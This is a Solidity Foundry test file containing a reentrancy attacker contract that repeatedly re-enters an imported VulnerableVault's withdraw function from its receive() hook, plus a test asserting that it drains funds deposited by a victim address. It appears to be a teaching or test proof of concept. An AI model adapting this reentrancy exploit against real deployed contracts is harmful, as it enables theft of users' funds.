pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/VulnerableVault.sol";

contract ReentrancyAttacker {
    VulnerableVault public vault;
    uint256 public attackCount;

    constructor(address _vault) {
        vault = VulnerableVault(_vault);
    }

    function attack() external payable {
        require(msg.value > 0, "need eth");
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    receive() external payable {
        attackCount++;

        if (address(vault).balance >= 1 ether && attackCount < 5) {
            vault.withdraw();
        }
    }
}

contract VulnerableVaultTest is Test {
    VulnerableVault vault;
    ReentrancyAttacker attacker;

    address victim = address(0xBEEF);
    address hacker = address(0xCAFE);

    function setUp() public {
        vault = new VulnerableVault();
        attacker = new ReentrancyAttacker(address(vault));

        vm.deal(victim, 10 ether);
        vm.deal(hacker, 1 ether);

        vm.prank(victim);
        vault.deposit{value: 10 ether}();
    }

    function testReentrancyAttack() public {
        uint256 vaultBefore = address(vault).balance;

        vm.prank(hacker);
        attacker.attack{value: 1 ether}();

        uint256 attackerBalance = address(attacker).balance;
        uint256 vaultAfter = address(vault).balance;

        assertGt(attackerBalance, 1 ether);
        assertLt(vaultAfter, vaultBefore);
    }
}
